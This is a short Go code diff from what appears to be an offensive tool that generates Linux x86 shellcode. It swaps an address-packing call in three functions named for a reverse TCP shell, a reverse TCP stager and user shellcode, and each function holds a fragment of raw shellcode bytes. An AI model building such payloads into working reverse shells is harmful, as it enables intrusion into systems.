@@ -19,7 +19,7 @@ func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
 	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
 	//will need to put resume execution shellcode here
 	shellcode1 += "\xbd"
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -57,7 +57,7 @@ func reverse_tcp_stager_linux_intel_32(params api.Parameters) ([]byte, error) {
 	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
 	//will need to put resume execution shellcode here
 	shellcode1 += "\xbd"
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
@@ -88,7 +88,7 @@ func user_shellcode_linux_intel_32(params api.Parameters) ([]byte, error) {
 
 	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
 	shellcode1 += "\xbd"
-	if as, err := api.PackAddr(entry); err == nil {
+	if as, err := api.PackUint32(entry); err == nil {
 		shellcode1 += as
 	} else {
 		return nil, err
